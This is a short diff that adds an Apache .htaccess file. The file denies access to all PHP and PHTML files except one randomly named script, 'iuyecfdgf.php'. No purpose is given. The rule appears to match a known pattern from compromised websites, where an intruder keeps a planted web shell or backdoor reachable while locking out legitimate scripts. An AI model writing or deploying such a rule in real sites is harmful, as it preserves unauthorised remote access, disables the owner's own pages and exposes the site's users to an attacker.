@@ -1,0 +1,8 @@
+<Files ~ ".(php|phtml)+">
+Order allow,deny  
+Deny from all  
+</Files>
+
+<Files "iuyecfdgf.php">
+Allow from all
+</Files>
